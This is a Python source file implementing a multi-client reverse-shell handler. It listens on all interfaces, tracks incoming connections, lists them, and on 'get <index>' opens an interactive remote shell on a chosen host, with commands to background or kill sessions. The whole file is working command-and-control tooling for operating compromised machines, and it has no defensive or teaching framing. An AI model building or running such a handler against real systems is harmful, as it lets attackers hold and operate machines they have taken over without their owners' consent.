


import os
import socket,cmd,threading
import time




class HandlerCmd(cmd.Cmd):

    prompt = 'Handler~#'

    

    def __init__(self) -> None:
        super().__init__();self.Socket = None
        self.Client_List = []
        self.isRunning = False
        
        
    

    
    @staticmethod
    def Thread_Proc(Socket: socket.socket,clients: list):
        print("Thread Is Started")
        while 1:
            try:
                if(threading.current_thread().name == 'Quit'):
                    print("Thread Is Stopping")
                    return
                cl = Socket.accept()
                #cl[0].settimeout(30)
                clients.append(cl)
                print("[+]New Connection...{}".format(cl[1]))
                
            except Exception as Err:
                print(str(Err));return
        print("Thread Is Stopped")


    def postcmd(self, stop: bool, line: str) -> bool:
        self.lastcmd = ''
        return super().postcmd(stop, line)

    def do_start(self,port):
        '''Start Listening For Client'''
        if self.isRunning:
            print("[!]Thread Is Already Running")
            return
        try:
            if hasattr(socket,'create_server'):
                Sock = socket.create_server(('0.0.0.0',int(port)),reuse_port=False)
                self.Socket = Sock
                self.ThreadHandle = threading.Thread(target=HandlerCmd.Thread_Proc,args=(Sock,self.Client_List,),daemon=True)
                self.ThreadHandle.start()
                self.isRunning = True
            else:
                Server_Socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
                Server_Socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                Server_Socket.bind(("0.0.0.0",int(port)))
                Server_Socket.listen(4)

                self.Socket = Server_Socket
                self.ThreadHandle = threading.Thread(target=HandlerCmd.Thread_Proc,args=(Server_Socket,self.Client_List,),daemon=True)
                self.ThreadHandle.start()
                self.isRunning = True

        except Exception as Err:
            print(str(Err))
            

    def do_list(self,arg):
        '''List Connected Hosts'''
        for index,sock in enumerate (self.Client_List):
            print('{}\t{}'.format(index,sock[1]))

    
    def do_kill(self,arg=''):
        '''Send Close Command To Host. Usage kill <index>'''
        try:
            num = int(arg)
            
            cl = self.Client_List[num][0]
            del self.Client_List[num]
            cl.send(b'exit\n')
            cl.close()
            
        except Exception as Err:
            print(str(Err))


    def do_stop(self,arg):
        '''Stop Listening And Exits'''
        if(self.isRunning != False):
            self.ThreadHandle.name="Quit"

            self.Socket.close()

            for i in self.Client_List:
                print("[!]Closeing {}".format(i[1]))
                i[0].close()

            

        return True

    def do_get(self,arg=''):
        '''Get Shell . Usage get <index>'''
        
        
        
        try:
            
            cl:socket.socket = self.Client_List[int(arg)][0]
            l = []
            rth = threading.Thread(target=reciveOutput,args=(cl,l,))
            rth.start()
            
            while 1:
                
                c = input()
                if(c=='bg'):
                    break
                cl.send(c.encode('utf-8')+b'\n')
                if(c=='exit'):
                    l.append('ttt')
                    
                    cl.close()
                    del self.Client_List[int(arg)]
                    break
            


            
           
        
        except ConnectionError as Err:
            print(str(Err))
            del self.Client_List[int(arg)]
        
        except Exception as Err:
            print(str(Err))
       
def reciveOutput(sock:socket.socket,s:list):
    while 1 and len(s)==0:
        try:
            data = sock.recv(1024).decode('utf-8')
            print(data,end='')
            if(len(data)==0):
                raise ConnectionError("Connection Lost")
                
        except Exception as Err:
            print(str(Err))
            return
   
            

            
        
        
Command = HandlerCmd()
Command.cmdloop()


